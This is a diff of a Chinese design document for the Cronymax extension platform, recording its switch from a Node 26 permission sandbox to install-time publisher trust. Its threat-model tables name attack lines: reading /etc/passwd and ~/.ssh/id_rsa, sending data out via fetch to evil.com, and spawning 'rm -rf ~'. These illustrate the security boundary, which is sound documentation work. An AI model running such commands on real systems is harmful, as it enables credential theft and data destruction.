@@ -1,10 +1,20 @@
 # Cronymax 扩展平台 — 设计文档 v0.3
 
-状态：**Phase 0 评议通过（2026-05-20），Phase 1 启动中**
+状态：**Phase 0 评议通过（2026-05-20），Phase 1+ 推进中**
 
-替换关系：**本文档替代 spec-v0.2**。v0.2 的"Node 22 LTS + 网络软门控 + child_process 平台 wrap"已废弃。v0.3 目标 Node 26（Permission Model 完整版），所有 capability 全靠 Node VM 层强制，平台仅写极少量 bootstrap.js hook（console.* 拦截 + EH 错误处理）；不写 require 劫持 / 命令白名单 / 网络包装 / 命名审计 hook。
+> **⚠️ 2026-05-20 v1-alpha 修订：去除 Node 26 Permission Model**
+>
+> 经过 dogfood UX 评估，v1 alpha **撤回**了 Node 26 capability gate 的设计。原因详见 [`permission-removal.md`](permission-removal.md)。
+>
+> **§6 整章已重写** —— 撤回内容：`build_node_flags` 翻译表 / 安装期 per-cap 同意 UI / fs path 白名单变量 / 绕过路径攻击面表。**§7 γ 阶段 OS sandbox 改为可选未来工作**。
+>
+> 新模型摘要：扩展进程**不带** `--permission` 或 `--allow-*` flag，拥有完整 Node API；信任边界从"代码级 OS gate"挪到"作者级 install-time 信任"，与 VS Code 同位。Per-extension host 保留（VS Code 没有的崩溃隔离卖点）。
+>
+> 仍然有效的：`§6.1.1` fd 3 RPC 通道、`§6.3` `cronymax.*` 命名空间锁定（platform-RPC 层、不是 OS 层）、`§6.1.2` 平台变量仍作为 `ctx.*Path` / env 路径来源（不再用于 flag 翻译）。
 
-**Phase 0 评议引入的修订**：详见 §16.1 速查表 + [`phase-0-review.md`](phase-0-review.md)。配套文档：[`extension-logs.md`](extension-logs.md)（日志系统设计）、[`node26-permission-spike.md`](node26-permission-spike.md)、[`msgpack-rpc-spike.md`](msgpack-rpc-spike.md)、[`legacy-agent-step.md`](legacy-agent-step.md)。
+替换关系：**本文档替代 spec-v0.2**。v0.2 的"Node 22 LTS + 网络软门控 + child_process 平台 wrap"已废弃。v0.3 原定目标 Node 26（Permission Model 完整版），后续 v1-alpha 修订（见上方）去除了 Permission Model 依赖，仅保留 Node 26 作为运行时基线（不依赖其 capability flag）。
+
+**Phase 0 评议引入的修订**：详见 §16.1 速查表 + [`phase-0-review.md`](phase-0-review.md)。配套文档：[`permission-removal.md`](permission-removal.md)（v1-alpha 撤回 permission model 的决策记录）、[`extension-logs.md`](extension-logs.md)（日志系统设计）、[`node26-permission-spike.md`](node26-permission-spike.md)、[`msgpack-rpc-spike.md`](msgpack-rpc-spike.md)、[`legacy-agent-step.md`](legacy-agent-step.md)。
 
 ---
 
@@ -60,18 +70,14 @@ cronymax 是 **agent workflow 应用**。
 │ bytedance.coco   │  │ acme.mermaid     │  │ ...              │
 │                  │  │                  │  │                  │
 │ node 26 \        │  │ node 26 \        │  │ node 26 \        │
-│  --permission \  │  │  --permission \  │  │  --permission \  │
-│  --allow-fs-     │  │  --allow-fs-     │  │  ...             │
-│   read=ws \      │  │   read=ws \      │  │                  │
-│  --allow-fs-     │  │                  │  │                  │
-│   write=ws \     │  │                  │  │                  │
-│  --allow-net=    │  │                  │  │                  │
-│   api.foo.com \  │  │                  │  │                  │
-│  --allow-child-  │  │                  │  │                  │
-│   process \      │  │                  │  │                  │
+│  --no-warnings \ │  │  --no-warnings \ │  │  --no-warnings \ │
 │  bootstrap.js    │  │  bootstrap.js    │  │  bootstrap.js    │
 │                  │  │                  │  │                  │
-│ ↓ vm.Context     │  │ ↓ vm.Context     │  │ ↓ vm.Context     │
+│  (v1 alpha:      │  │  (full Node API; │  │                  │
+│   no --permission│  │   信任由 install-│  │                  │
+│   no --allow-*)  │  │   time 给出)     │  │                  │
+│                  │  │                  │  │                  │
+│ ↓ require        │  │ ↓ require        │  │ ↓ require        │
 │ main.ts + deps   │  │ main.ts + deps   │  │ main.ts + deps   │
 └────────┬─────────┘  └──────────────────┘  └──────────────────┘
          │
@@ -81,40 +87,40 @@ cronymax 是 **agent workflow 应用**。
    └──────────────────┘
 ```
 
-### 安全模型分层
+### 安全模型分层（v1-alpha 修订）
 
 | 层 | 实现 | 何时上 |
 |---|---|---|
-| **L0 · 进程隔离** | Node host 独立 OS 进程，扩展崩不拖死 cronymax | v1 |
-| **L1 · 静态契约 + 安装期授权** | manifest 申报 capabilities；安装时用户审 | v1 |
-| **L2 · VM 强制（Node Permission）** | `--permission --allow-*` 由 Rust 根据 manifest 拼出，**Node 全管**：fs / network / child_process / worker / addons / ffi / inspector | **v1** |
-| **L3 · OS Sandbox（外层）** | sandbox-exec / bubblewrap / Job Object，kernel 级 | **M1** |
-| **L4 · Marketplace + 签名 + 行为监控** | 社会化机制 | M2+ |
-
-α(v1) → γ(M1) 是叠加式升级，不破坏扩展兼容。
+| **L0 · 进程隔离** | 每扩展独立 Node host OS 进程，单扩展崩溃不拖死 cronymax 和其他扩展 | **v1** |
+| **L1 · Install-time 作者信任** | 安装弹窗显示"由 \<publisher\> 提供"；用户决定信不信发行方 | **v1** |
+| **L2 · Platform-RPC 命名空间锁定** | `cronymax.*` namespace 在 RPC 路由层保留给平台（emit / publisher / command id 三处） | **v1** |
+| ~~L3 · VM 强制（Node Permission Model）~~ | ~~Node 26 `--permission` + `--allow-*`~~ | **撤回**，见 [`permission-removal.md`](permission-removal.md) |
+| **L4 · 可选 OS Sandbox（平台级）** | sandbox-exec / bubblewrap / Job Object，cronymax 全局开关 | M1+ 视情况 |
+| **L5 · Marketplace + 签名 + 行为监控** | 社会化机制 | M2+ |
 
 ---
 
 ## 2. L1 Kernel — 14 个原语
 
-| 原语 | 实现 | Capability flag |
+> **v1-alpha 修订**：原"Capability flag"列已撤回（fs / network / process 等不再 OS 层强制）。下表列的是平台提供的 API surface 和 RPC 路由层的 namespace 约束。
+
+| 原语 | 实现 | 平台层约束 |
 |---|---|---|
 | `lifecycle` | `activate(ctx)` / `deactivate()` | n/a |
-| `capabilities` | manifest 静态声明 | n/a |
-| `commands` | 注册具名可调用 | 自家命名空间永远允许 |
-| `events` | pub/sub topic | `events.subscribe` / `events.emit` 白名单 |
-| `config` | get/update + onDidChange | `config.schema` 申报 |
-| `secrets` | Keychain / DPAPI / secret-service | `secrets.namespace` 锁前缀 |
+| `commands` | 注册具名可调用 | `cronymax.*` namespace 保留给平台 |
+| `events` | pub/sub topic | `cronymax.*` topic 平台 emit 专用；扩展 emit 时拒 |
+| `config` | get/update + onDidChange | n/a |
+| `secrets` | Keychain / DPAPI / secret-service | `cronymax.*` secret id 保留 |
 | `storage` | per-extension state KV | n/a |
-| `process` | 真 Node child_process | **Node `--allow-child-process`** |
-| `fs` | 真 Node fs | **Node `--allow-fs-read/-write`** |
-| `network` | 真 Node fetch / WebSocket / net | **Node `--allow-net`**（Node 26+）|
-| `ui-slots` | 标识贡献槽位 | `ui-slots` 列表 |
+| `process` | 扩展直接用 `node:child_process` | n/a（无 OS gate） |
+| `fs` | 扩展直接用 `node:fs` | n/a（无 OS gate） |
+| `network` | 扩展直接用 `fetch` / `node:net` | n/a（无 OS gate） |
+| `ui-slots` | 标识贡献槽位 | n/a |
 | `webview` | CEF iframe + postMessage 中转 | n/a |
-| `auth` | 内置 OAuth / PKCE / device-flow | `auth.providers` 白名单 |
+| `auth` | 内置 OAuth / PKCE / device-flow | n/a |
 | `extensions` | getExtension + exports | n/a |
 
-**关键**：fs / network / process 这三大块**全部由 Node Permission Model 在 VM 层强制**。平台代码不写任何 require 劫持、命令白名单或网络包装层。
+**关键**：fs / network / process 三大块**扩展直接用 Node API**，平台不 wrap、不 gate。VS Code 同位的信任模型。
 
 ### SDK 形状
 
@@ -271,73 +277,28 @@ VS Code 等量场景 EH 一进程 ~500-1000MB；cronymax 独立 host 模型 RAM 
 
 ---
 
-## 6. 安全模型 · α 阶段（v1）
+## 6. 信任模型 · v1 alpha
 
-### 6.1 一份代码：build_node_flags
+> **本章在 2026-05-20 重写**。之前的 capability-flag 强制模型撤回，原因见 [`permission-removal.md`](permission-removal.md)。
+
+### 6.1 信任边界：install-time 作者信任
+
+v1 alpha 不在 OS 层 gate 扩展。扩展进程拥有完整 Node API（fs / network / child_process / workers / native addons）。信任由用户在**安装时**对**扩展作者**给出，没有运行时 per-capability gate。
 
 ```rust
 // crates/cronymax/src/extensions/capability.rs
-fn build_node_flags(
-    manifest: &Manifest,
-    ctx: &ExpansionCtx,   // {workspace, ext_dir, ext_storage, ext_global_storage, home, tmp}
-) -> Vec<String> {
-    // 平台基础设施 —— 永远 emit，不归用户 capability：
-    let mut flags = vec![
-        "--permission".to_string(),
-        "--no-warnings".to_string(),  // 抑制 SecurityWarning / ExperimentalWarning
-    ];
-
-    // 平台必给的 fs（扩展私有存储），永远 rw
-    for path in [&ctx.ext_dir, &ctx.ext_storage, &ctx.ext_global_storage] {
-        emit_fs(&mut flags, path, "rw");
-    }
-
-    // 用户 manifest 申报的 fs（数组形式 + 平台变量）
-    for fs_spec in &manifest.capabilities.fs {
-        let expanded = expand_vars(&fs_spec.path, ctx)?;         // {WORKSPACE}/x → /Users/.../x
-        // 路径 traversal 检查：expanded canonicalize 后必须仍在变量根下
-        let canonical = std::fs::canonicalize(&expanded)
-            .unwrap_or_else(|_| expanded.clone());                // 路径不存在时退回 expanded
-        emit_fs(&mut flags, &canonical, &fs_spec.mode);
-        if canonical != expanded {                                // symlink: 双填
-            emit_fs(&mut flags, &expanded, &fs_spec.mode);
-        }
-    }
-
-    // network: v1 boolean，按需 emit（不带 =host —— Node 26.1.0 不支持主机过滤）。
-    // manifest.network.allow 仅作安装期人话授权 UI 用。
-    if manifest.capabilities.network.is_some() {
-        flags.push("--allow-net".to_string());
-    }
-
-    // 其余 boolean flag
-    if matches!(manifest.capabilities.process, Some(true)) {
-        flags.push("--allow-child-process".to_string());
-    }
-    if matches!(manifest.capabilities.workers, Some(true)) {
-        flags.push("--allow-worker".to_string());
-    }
-    if matches!(manifest.capabilities.native_addons, Some(true)) {
-        flags.push("--allow-addons".to_string());
-    }
-    // ffi / inspector / wasi v1 一律不开
-
-    flags
-}
-
-fn emit_fs(flags: &mut Vec<String>, path: &Path, mode: &str) {
-    flags.push(format!("--allow-fs-read={}", path.display()));
-    if mode == "rw" {
-        flags.push(format!("--allow-fs-write={}", path.display()));
-    }
+//
+// v1 alpha 的 build_node_flags 几乎没事可做。
+pub fn build_node_flags(_manifest: &Manifest, _ctx: &ExpansionCtx) -> ExtensionResult<Vec<String>> {
+    Ok(vec!["--no-warnings".to_string()])
 }
 ```
 
-**这就是全部 flag 部分**。bootstrap 不写任何 require 劫持、命令白名单、网络包装、审计 hook。Node 26 Permission Model 全管。
+**只 emit `--no-warnings`**（抑制 Node experimental warning 噪音）。**不 emit** `--permission`、不 emit 任何 `--allow-*`。
 
 ### 6.1.1 RPC 通道：inherited fd 3，不走 Unix socket
 
-Spawn Node host 时 stdio 配置：
+虽然不再 emit `--allow-net`，**fd 3 仍然是 RPC 通道**：
 
 ```rust
 Command::new(&node_bin)
@@ -349,109 +310,96 @@ Command::new(&node_bin)
     .spawn()
 ```
 
-子进程 Node 端 bootstrap.js：
-
 ```js
 const net = require("node:net");
-const rpc = new net.Socket({ fd: 3 });    // wrap inherited fd; 不需要 --allow-net
+const rpc = new net.Socket({ fd: 3 });
 ```
 
-**关键**：早期设计假设 RPC 走 Unix socket，但 Node 26 把 socket `connect` 也算 network ACL（实测 spike P0-T04），强迫平台 emit `--allow-net`，跟"网络是用户 capability"语义冲突。改 RPC 走 stdio fd 3 后：
-
-- RPC 通道不触发 Node permission（inherited fd）
-- `--allow-net` 真正回归为用户 capability（manifest `network` 申报才 emit）
-- 安装期人话授权 UI 上"网络"那条变诚实
+保留 fd 3 原因：
+- 跟扩展用的 IPC 通道完全分离，不会跟扩展自己开的 Unix socket / TCP 混
+- 父进程通过 `pre_exec + dup2` 注入，扩展拿不到 RPC fd 之外的"控制平面"权限去伪造平台事件
+- 跟 stdout / stderr 自然分流，平台的日志 / 扩展的 `console.log` 互不干扰
 
 ### 6.1.2 平台变量集
 
-manifest `fs.path` 必须用以下变量（白名单封闭集）：
+变量仍存在，但**只作为 `ctx.*Path` / 环境变量的来源**，不再用于 capability flag 翻译。Manifest 里**不需要**通过 `capabilities.fs` 申报这些变量。
 
-| 变量 | 展开值 | 永远授权 |
+| 变量 | 展开值 | 给扩展的方式 |
 |---|---|---|
-| `{WORKSPACE}` | 当前 cronymax 工作区根（未开工作区时变量不可用）| ❌ 需扩展申报 |
-| `{HOME}/<subpath>` | `$HOME` / `%USERPROFILE%`；裸 `{HOME}` 拒收 | ❌ |
-| `{EXT_DIR}` | `~/.cronymax/extensions/<id>/` | ✅ 平台必给（只读） |
-| `{EXT_STORAGE}` | `~/.cronymax/extensions/<id>/storage/` | ✅ 平台必给（读写） |
-| `{EXT_GLOBAL_STORAGE}` | `~/.cronymax/global-state/<id>/` | ✅ 平台必给（读写） |
-| `{TMP}/<subpath>` | `os.tmpdir()` | ❌ |
-| `{CRONYMAX_CONFIG}/<subpath>` | `~/.cronymax/` | ❌ |
+| `{WORKSPACE}` × N | 当前所有打开的 workspace 根（v1 multi-root） | `ctx.workspaceFolders[]`、`CRONYMAX_WORKSPACE_FOLDERS` env（JSON 数组） |
+| `{HOME}` | `$HOME` / `%USERPROFILE%` | 扩展用 `os.homedir()`；平台不特别注入 |
+| `{EXT_DIR}` | `~/.cronymax/extensions/<id>/` | `ctx.extensionPath`、`CRONYMAX_EXTENSION_DIR` env |
+| `{EXT_STORAGE}` | `~/.cronymax/extensions/<id>/storage/` | `ctx.storagePath`、`CRONYMAX_EXTENSION_STORAGE` env |
+| `{EXT_GLOBAL_STORAGE}` | `~/.cronymax/global-state/<id>/` | `ctx.globalStoragePath`、`CRONYMAX_EXTENSION_GLOBAL_STORAGE` env |
+| `{TMP}` | `os.tmpdir()` | 扩展用 `os.tmpdir()` |
+| `{CRONYMAX_CONFIG}` | `~/.cronymax/` | 扩展不直接拿；走 `cronymax.workspace.getConfiguration()` |
 
-校验规则：
-- 变量名不在白名单 → 安装期拒
-- 绝对路径硬写（`/Users/...`）→ 安装期拒
-- Path traversal（`..` 跳出变量根）→ 校验时 canonicalize 后比较根，跳出则拒
-- 裸 `{HOME}` / 裸 `{TMP}` → 拒（必须有子路径）；`{WORKSPACE}` 可裸用
+环境变量全部传 **canonical 路径**（symlink 已解开）。扩展直接读 `ctx.storagePath` 等就能避开 macOS `/var` ↔ `/private/var` 那类 realpath 解析坑。
 
-### 6.2 安装期人话授权
-
-manifest capabilities 译成清单（all-or-nothing；取消 = 不安装；post-install 可在设置面板撤销单项）：
+### 6.2 安装期同意
 
 ```
-┌───────────────────────────────────────────────────────────┐
-│ 安装 Coco                                                  │
-│ by bytedance · v0.1.0                                      │
-│                                                            │
-│ 此扩展将能够：                                              │
-│  📁 读写当前工作区（{WORKSPACE}）                            │
-│  📁 读写 ~/.coco                                            │
-│  ⚙ 启动子进程（任意命令）                                   │
-│  🌐 访问网络（声明的具体域：api.openai.com；v1 不区分主机） │
-│  🔑 存储 bytedance.coco.* 命名空间下的密钥                  │
-│  💬 注册为聊天 agent provider                               │
-│                                                            │
-│ [详情]                          [取消]  [安装]              │
-└───────────────────────────────────────────────────────────┘
+┌────────────────────────────────────────────┐
+│ 安装 Coco                                   │
+│ by bytedance · v0.1.0                       │
+│                                             │
+│ 这个扩展将由 bytedance 提供。               │
+│                                             │
+│ [详情]            [取消]      [安装]         │
+└────────────────────────────────────────────┘
 ```
 
-UX 约定：
-- 弹窗 all-or-nothing；【取消】= 不解压、不留痕迹；【安装】= 解压 + 写 registry + enabled
-- 不显示"平台必给"项（`{EXT_DIR}` / `{EXT_STORAGE}` / `{EXT_GLOBAL_STORAGE}` / 平台 RPC 通道）—— 是基础设施而非用户授权
-- 网络项**诚实标注**"v1 不区分主机"（Node 26.1.0 限制；M1+ host-scoped 落地后改回）
-- post-install 在"设置 → 扩展 → \<ext\> → 权限"撤销单项（撤销 → 下次 spawn 不 emit 对应 flag → 扩展运行时拿 `ERR_ACCESS_DENIED`）
-- 平台强制 flag（`--permission` / `--no-warnings` / `--allow-net` for RPC / 扩展私有存储 fs）UI 上不出现撤销勾选
+**没有** per-capability 列表、**没有**风险提示。决定全在"信不信发行方"。这跟 VS Code 安装扩展的 UX 一致。
 
 ### 6.3 命名空间锁定
 
+唯一保留的 gate —— 但**在平台 RPC 路由层，不是 OS 层**：
+
 | 命名空间 | 谁拥有 | 第三方写 |
 |---|---|---|
-| `cronymax.*` | 平台 | 安装期校验拒绝 |
+| `cronymax.*` | 平台 | 安装期校验拒（`publisher == "cronymax"` 拒；`cronymax.*` event topic 拒；`cronymax.*` command id 拒） |
 | `<publisher>.*` | 该 publisher | 仅自家扩展 |
 
-### 6.4 防绕过路径（Node 26 实测）
+理由：扩展 emit `cronymax.message.user.sent` 假冒平台事件、抢注 `cronymax.builtin.foo` 命令、抢注 `cronymax.system` 密钥都是 platform-RPC-routing 层问题，跟 OS 权限正交。这层保留。
 
-| 绕路尝试 | 结果 |
+### 6.4 v1-alpha 不防的攻击
+
+明确列出来，让用户和发行方都知道边界：
+
+| 攻击 | v1 alpha 拦截？ |
 |---|---|
-| `fs.readFileSync('/etc/passwd')` | ✅ `ERR_ACCESS_DENIED` |
-| `eval("require('fs').readFileSync('/etc/passwd')")` | ✅ 拦 |
-| `process.binding('fs').open(...)` | ✅ 拦 |
-| `Function('return require')()` | ✅ require 不可达 |
-| `vm.runInThisContext('require...')` | ✅ require 不可达 |
-| `import('fs')` 动态导入 | ✅ 拦 |
-| `fetch('https://evil.com')` — 扩展未声明 `network` | ✅ `--allow-net` 不 emit → 拦 |
-| `fetch('https://evil.com')` — 扩展已声明 `network: ["api.openai.com"]` | ⚠️ v1 通（Node 26.1.0 `--allow-net` 是 boolean，不分主机；M1+ Node host-scoped 落地后才能拦） |
-| `net.createConnection(...)` 不在白名单 | ✅/⚠️ 同上 |
-| `process.dlopen` 加载 .so | ✅ `--allow-ffi` 默认禁 |
-| 扩展自挂 inspector | ✅ `--allow-inspector` 默认禁 |
-| Native addon | ✅ `--allow-addons` 默认禁 |
+| 恶意扩展读 `~/.ssh/id_rsa` | ❌ 不拦（扩展有完整 fs 权限） |
+| 恶意扩展 `fetch('https://evil.com', ...)` 外发数据 | ❌ 不拦 |
+| 恶意扩展 spawn `rm -rf ~` | ❌ 不拦 |
+| 恶意扩展加载 `.node` native addon | ❌ 不拦 |
+| 恶意扩展 emit `cronymax.message.assistant.done` 伪造平台事件 | ✅ 拦（platform-RPC 命名空间） |
+| 恶意扩展使用 `publisher = "cronymax"` 冒充官方 | ✅ 拦（install-time 校验） |
+| 恶意扩展跨进程拖死同 workspace 别的扩展 | ✅ 不会发生（per-extension host） |
+| 一个扩展崩溃影响别的扩展 | ✅ 不会发生（同上） |
 
-**剩余可能的攻击**（α 拦不住，γ OS sandbox 兜底）：
-- 资源耗尽（无限循环 / 内存爆掉）—— 靠 Rust 监控 + 限额
-- 时间侧信道 —— 几乎无法防
-- 滥用授权范围内的能力（fs.workspace 给了 rw，扩展真写工作区）—— 这是用户授权的责任
+**用户的防御**是发行方信任 —— 装之前看是谁发布的，看 GitHub stars、issue 反应、code review 是否公开。
+
+### 6.5 后续可选加固
+
+v1.x / M1 阶段如果有用户抱怨"扩展太开放"，平台**可选**在**平台层**（不是扩展层）叠加 OS sandbox（macOS sandbox-exec、Linux bubblewrap、Windows Job Object）。这是 cronymax 用户的总开关，不通过 manifest 配置 —— 见 §7。
+
+**关键设计原则**：扩展开发者写 manifest 时**不需要思考**安全边界 —— 那是用户和平台的事。这跟 VS Code 同位，跟 v0.3 原始设计（每扩展自己申报 capability）正相反。
 
 ---
 
-## 7. 安全模型 · γ 阶段（M1）
+## 7. 可选加固：平台层 OS sandbox（M1+ 未排期）
 
-OS sandbox 外层叠加，对扩展代码、manifest、SDK 零侵入：
+v1 alpha **没有**这一层 —— 撤回 Node 26 Permission Model 后，唯一的安全边界是"用户信任扩展作者"（§6.1）。如果某个 cronymax 部署场景需要更严格的隔离（譬如企业内部 sysadmin 部署给非可信用户），可以在**平台层**叠加 OS sandbox：
 
 ```
 Rust core spawn:
-  sandbox-exec -f /tmp/<ext-id>.sb -- \
-    node 26 --permission --allow-* bootstrap.js
-                                                        ↑
-                                              v1 已有的 Node host
+  sandbox-exec -f /tmp/cronymax.sb -- \
+    node 26 bootstrap.js
+                          ↑
+                v1 已有的 Node host（不带 --permission）
 ```
+
+关键：sandbox profile 是**平台级**（cronymax 用户的全局开关），**不**让扩展开发者通过 manifest 配置。开发者写 manifest 时不感知这一层；平台或 sysadmin 决定开不开。
 
 | 平台 | 实现 | 工程量 |
 |---|---|---|
@@ -460,6 +408,8 @@ Rust core spawn:
 | Windows | Job Object + AppContainer | ~2 周 |
 | 共用：profile 生成 + 测试 | ~1 周 |
 | **小计** | **4-5 周** |
+
+**v1 alpha 不做此项**。未来如果加，profile 内容大致："允许扩展进程读写它的 `ctx.*Path` 列表里的目录 + 用户当前所有 workspace folders + `os.tmpdir()`；拒绝读 `~/.ssh` `~/.aws` `~/.config/gh` 之类高敏感目录；网络默认开"。具体规则等真有 deploy case 再定。
 
 ---
 
@@ -495,37 +445,19 @@ Rust core spawn:
     "cronymax.config.page": [...]
   },
 
-  // 能力（极简；fs 用平台变量数组）
-  "capabilities": {
-    "fs": [
-      { "path": "{WORKSPACE}",          "mode": "rw" },
-      { "path": "{HOME}/.coco",         "mode": "rw" },
-      { "path": "{HOME}/.config/coco",  "mode": "r"  }
-    ],
-    "network": { "allow": ["api.openai.com", "*.openai.com"] },  // v1 仅人话授权用，不分主机
-    "process": true,                              // boolean
-    "workers": false,
-    "native_addons": false,
-    "secrets": { "namespace": "publisher.name.*" },
-    "events.subscribe": ["cronymax.message.assistant.done"],
-    "events.emit":      ["publisher.name.*"],
-    "ui-slots":         ["sidebar", "settings"],
-    "extension-points": ["cronymax.agents.provider", "cronymax.command"],
-    "auth.providers":   ["oauth-generic"]
-  },
-
   // 跨扩展依赖
   "extensionDependencies": ["other.extension"]
 }
 ```
 
+> **v1-alpha 修订**：`capabilities` 字段已撤回（曾包含 `fs / network / process / workers / native_addons / secrets / events.subscribe / events.emit / ui-slots / extension-points / auth.providers`）。旧 manifest 里如果还有这个字段，平台**接受**但**不解释** —— 内容会被忽略。新扩展不需要写。撤回原因见 [`permission-removal.md`](permission-removal.md)。
+
 ### 校验规则
 
 - `id` 必须 `<publisher>.<name>`；`<publisher>` 必须等于 `publisher` 字段
-- `contributes` key 必须以 `cronymax.` 开头且在 `capabilities.extension-points` 申报
-- 任何往 `cronymax.*` 命名空间写入安装期拒
-- `capabilities.fs[].path` 必须用平台变量（见 §6.1.2 表）；绝对路径硬写 / 未知变量 / path traversal 一律拒
-- 路径在 Rust 侧展开变量 + canonicalize 后传给 Node（每路径 emit 两条 `--allow-fs-*`：canonical + 原 expanded，覆盖 symlink）
+- `publisher == "cronymax"` 拒（平台保留）
+- `contributes` key 必须以 `cronymax.` 开头（platform-RPC 路由层；并非 OS 强制）
+- `activationEvents` 每条必须是已知前缀（`onStartup` / `*` / `onCommand:<id>` / `onAgentProvider:<id>` / `onView:<id>`）
 
 ---
 
@@ -567,15 +499,15 @@ Node host 路由到 vm.Context 内 panel.onDidReceiveMessage handler
                                                   未安装
 ```
 
-- **install**：解压 .crx 到 `~/.cronymax/extensions/<id>/`，校验 manifest，弹授权（all-or-nothing；见 §6.2）
+- **install**：解压到 `~/.cronymax/extensions/<id>/`，校验 manifest，弹安装确认（"由 \<publisher\> 提供，是否安装"；见 §6.2）
 - **activate**：
   1. Rust 检查 host 池
-  2. spawn Node 26 with `--permission --no-warnings --allow-* ... bootstrap.js`
+  2. spawn Node 26 with `--no-warnings bootstrap.js`（v1 alpha：没有 `--permission`、没有 `--allow-*`）
      · stdio: `[pipe, pipe, pipe, pipe]`（fd 0 stdin / fd 1 stdout→output.log / fd 2 stderr→host.log / fd 3 RPC）
   3. bootstrap.js wrap fd 3 为 net.Socket，握手，调 `extension/activate`
   4. require main.js（运行在 Node 主 vm context；不另开 vm.Context）
-  5. catch activate 抛出的异常 → audit.log + 通知用户激活失败
-- **crash 与错误处理**：详见 [`extension-logs.md`](extension-logs.md) §7 6 层错误处理 A-F；exit code 非零或 ping/pong 超时 → 自动重启 ≤ 3 次 → 超后禁用并通知用户
+  5. activate 抛出异常 → RPC response error 返回平台 → host.log 记录 stderr
+- **crash 与错误处理**：exit code 非零或 ping/pong 超时 → 自动重启 ≤ 3 次 → 超后禁用并通知用户。stderr / stdout pipe 进 `host.log` / `output.log` 作为操作排错用途（不是 security audit）
 
 ---
 
@@ -641,24 +573,9 @@ coco-extension/
       "title": "Coco · Advanced",
       "entry": "./dist/settings/index.html"
     }]
-  },
-
-  "capabilities": {
-    "fs": [
-      { "path": "{WORKSPACE}",  "mode": "rw" },
-      { "path": "{HOME}/.coco", "mode": "rw" }
-    ],
-    "process": true,
-    "network": { "allow": ["api.openai.com"] },
-    "secrets": { "namespace": "bytedance.coco.*" },
-    "ui-slots": ["settings"],
-    "extension-points": [
-      "cronymax.agents.provider",
-      "cronymax.command",
-      "cronymax.config.schema",
-      "cronymax.config.page"
-    ]
   }
+  // v1-alpha 修订：没有 capabilities 字段了。扩展有完整 Node API；
+  // coco 直接用 `node:fs`、`node:child_process`、`fetch()`。
 }
 ```
 
@@ -749,26 +666,22 @@ export class AcpClient {
 3. 用户点选 "Coco"
    → 触发 onAgentProvider:coco
    → Rust：spawn Node 26 host (stdio: [pipe,pipe,pipe,pipe]，fd 3 = RPC)：
-     node --permission --no-warnings \
-          --allow-fs-read=/Users/alice/work/cronymax-ws         \  ← {WORKSPACE} canonical
-          --allow-fs-write=/Users/alice/work/cronymax-ws        \
-          --allow-fs-read=/Users/alice/.coco                    \  ← {HOME}/.coco canonical
-          --allow-fs-write=/Users/alice/.coco                   \
-          --allow-fs-read=/Users/alice/.cronymax/extensions/bytedance.coco \  ← {EXT_DIR}（平台必给）
-          --allow-fs-read=/Users/alice/.cronymax/extensions/bytedance.coco/storage \  ← {EXT_STORAGE}
-          --allow-fs-write=/Users/alice/.cronymax/extensions/bytedance.coco/storage \
-          --allow-fs-read=/Users/alice/.cronymax/global-state/bytedance.coco \
-          --allow-fs-write=/Users/alice/.cronymax/global-state/bytedance.coco \
-          --allow-net               \  ← v1 boolean；用户声明了 network capability
-          --allow-child-process     \
-          extension-host-bootstrap.js --ext=bytedance.coco
+     node --no-warnings extension-host-bootstrap.js
+     env:
+       CRONYMAX_EXTENSION_MANIFEST=/Users/alice/.cronymax/extensions/bytedance.coco/cronymax-extension.json
+       CRONYMAX_EXTENSION_DIR=/Users/alice/.cronymax/extensions/bytedance.coco
+       CRONYMAX_EXTENSION_STORAGE=/Users/alice/.cronymax/extensions/bytedance.coco/storage
+       CRONYMAX_EXTENSION_GLOBAL_STORAGE=/Users/alice/.cronymax/global-state/bytedance.coco
+       CRONYMAX_WORKSPACE_FOLDERS=["/Users/alice/work/cronymax-ws"]
    → bootstrap.js wrap fd 3 为 net.Socket，握手
    → require main.js + 调 activate(ctx)
+   → ctx.workspaceFolders、ctx.storagePath 等已是 canonical 路径
    → register agents.provider("coco", ...)
 
 4. 用户配置 Coco / GPT-5.4 / plan，发消息
    → 聊天面板：provider.createSession()
-   → main.ts: spawn("coco", ["acp","serve"]) ← Node 验过 --allow-child-process 允许
+   → main.ts: `import { spawn } from "node:child_process"` → spawn("coco", ["acp","serve"])
+     （v1 alpha：无 OS gate，扩展直接用 Node API）
    → ACP initialize / session/new
    → 返回 CocoSession
 
@@ -928,18 +841,20 @@ flow runtime 走到 `type: agent, agent: code-reviewer` 时，从 registry 拿 C
 
 ## 16. 跟 v0.2 的差异速查
 
-| 项 | v0.2 | v0.3 |
-|---|---|---|
-| Node 版本 | Node 22 LTS | **Node 26** |
-| 网络 ACL | "manifest 信息披露不强制" | **Node `--allow-net` boolean**（Node 26.1.0 未落地 host-scoped）；manifest 仅人话授权 |
-| child_process 平台 wrap | "command + argsPattern 白名单" | **砍掉，纯 Node `--allow-child-process` boolean** |
-| 网络包装层 | "M1 bootstrap 包装 net/tls/http" | **砍掉** |
-| 审计 hook | "bootstrap 记 spawn 日志" | **审计走平台 audit.log 结构化**（不在 bootstrap 写）|
-| FFI / inspector / addons | 未控 | **Node `--allow-ffi/-inspector/-addons` 默认禁** |
-| manifest capabilities | `process: { allow: [...] }` 复杂结构 | **`process: true` boolean**；`fs` 改 `[{path, mode}]` + 平台变量 |
-| α 安全实施工程量 | ~5 天 | **~3 天**（Phase 0 评议后含 RPC fd 3 改 + 平台变量展开）|
-| IPC | Unix socket / Named Pipe | **Inherited fd 3**（Phase 0 评议改） |
-| 扩展日志系统 | 未设计 | **入 v1**（详 `extension-logs.md`）|
+> **v1-alpha 修订**：这张表展示的是 v0.3 **原始**提案对 v0.2 的差异。v0.3 在 2026-05-20 自身又经历了一次大修订（撤回 Node Permission Model）—— 见本文档顶部 banner 和 [`permission-removal.md`](permission-removal.md)。下面"v0.3"列描述的是原始提案；**当前实际方案**见各章正文。
+
+| 项 | v0.2 | v0.3 原始提案 | v0.3 v1-alpha 实际 |
+|---|---|---|---|
+| Node 版本 | Node 22 LTS | Node 26 | Node 26（仅作为 runtime 基线，不依赖 Permission Model） |
+| 网络 ACL | "manifest 信息披露不强制" | Node `--allow-net` boolean | **不 gate**；扩展直接用 Node fetch / net |
+| child_process 平台 wrap | "command + argsPattern 白名单" | 纯 Node `--allow-child-process` boolean | **不 gate**；扩展直接用 `node:child_process` |
+| 网络包装层 | "M1 bootstrap 包装 net/tls/http" | 砍掉 | 同 |
+| 审计 hook | "bootstrap 记 spawn 日志" | audit.log 结构化 | **撤回**；只保留 host.log / output.log 操作日志 |
